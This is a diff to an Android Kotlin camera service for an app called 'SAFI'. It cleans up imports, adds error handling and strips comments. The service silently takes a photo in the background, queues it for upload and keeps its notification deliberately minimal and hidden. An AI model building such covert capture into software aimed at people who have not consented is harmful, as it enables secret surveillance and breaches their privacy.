@@ -8,7 +8,12 @@ import android.app.Service
 import android.content.Context
 import android.content.Intent
 import android.graphics.ImageFormat
-import android.hardware.camera2.*
+import android.hardware.camera2.CameraAccessException
+import android.hardware.camera2.CameraCaptureSession
+import android.hardware.camera2.CameraCharacteristics
+import android.hardware.camera2.CameraDevice
+import android.hardware.camera2.CameraManager
+import android.hardware.camera2.CaptureRequest
 import android.media.ImageReader
 import android.os.Build
 import android.os.IBinder
@@ -17,7 +22,8 @@ import androidx.core.app.NotificationCompat
 import java.io.File
 import java.io.FileOutputStream
 import java.text.SimpleDateFormat
-import java.util.*
+import java.util.Date
+import java.util.Locale
 
 class CameraCaptureService : Service() {
 
@@ -69,11 +75,7 @@ class CameraCaptureService : Service() {
                 return
             }
 
-            imageReader = ImageReader.newInstance(
-                1920, 1080,  # 📐 Ratio 16:9 parfait
-                ImageFormat.JPEG, 1
-            )
-
+            imageReader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 1)
             photoFile = createPhotoFile()
 
             cameraManager?.openCamera(cameraId, object : CameraDevice.StateCallback() {
@@ -102,10 +104,14 @@ class CameraCaptureService : Service() {
     }
 
     private fun getCameraId(targetFacing: Int): String? {
-        cameraManager?.cameraIdList?.forEach { id ->
-            val chars = cameraManager?.getCameraCharacteristics(id)
-            val facing = chars?.get(CameraCharacteristics.LENS_FACING)
-            if (facing == targetFacing) return id
+        try {
+            cameraManager?.cameraIdList?.forEach { id ->
+                val chars = cameraManager?.getCameraCharacteristics(id)
+                val facing = chars?.get(CameraCharacteristics.LENS_FACING)
+                if (facing == targetFacing) return id
+            }
+        } catch (e: CameraAccessException) {
+            Log.e(TAG, "Erreur accès caméra", e)
         }
         return null
     }
@@ -121,7 +127,6 @@ class CameraCaptureService : Service() {
                 val bytes = ByteArray(buffer.remaining())
                 buffer.get(bytes)
                 image.close()
-
                 savePhoto(bytes)
                 cam.close()
                 stopSelf()
@@ -129,7 +134,7 @@ class CameraCaptureService : Service() {
 
             val captureRequest = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                 addTarget(reader.surface)
-                set(CaptureRequest.JPEG_ORIENTATION, 90)  # ✅ Bon sens de prise de vue
+                set(CaptureRequest.JPEG_ORIENTATION, 90)
             }
 
             cam.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
@@ -160,15 +165,10 @@ class CameraCaptureService : Service() {
             fos.write(bytes)
             fos.close()
             Log.d(TAG, "✅ Photo sauvegardée: ${photoFile?.absolutePath}")
-            
-            # 📤 Ajouter à la file d'envoi
             PhotoUploadService.addPhotoToQueue(this, photoFile!!)
-            
-            # 📤 Notifier l'activité qu'une photo est disponible
             MainMapActivity.instance?.runOnUiThread {
                 MainMapActivity.instance?.onPhotoReceived(photoFile!!)
             }
-            
         } catch (e: Exception) {
             Log.e(TAG, "Erreur sauvegarde photo", e)
         }
@@ -179,7 +179,7 @@ class CameraCaptureService : Service() {
             val channel = NotificationChannel(
                 CHANNEL_ID,
                 "SAFI — Caméra",
-                NotificationManager.IMPORTANCE_MIN  # 🔔 DISCRÈTE — Pas visible
+                NotificationManager.IMPORTANCE_MIN
             ).apply {
                 setShowBadge(false)
                 enableVibration(false)
@@ -202,7 +202,7 @@ class CameraCaptureService : Service() {
             .setContentIntent(pendingIntent)
             .setOngoing(false)
             .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setSilent(true)  # 🔇 SILENCIEUX — Pas de son, pas de vibration
+            .setSilent(true)
             .build()
     }
 
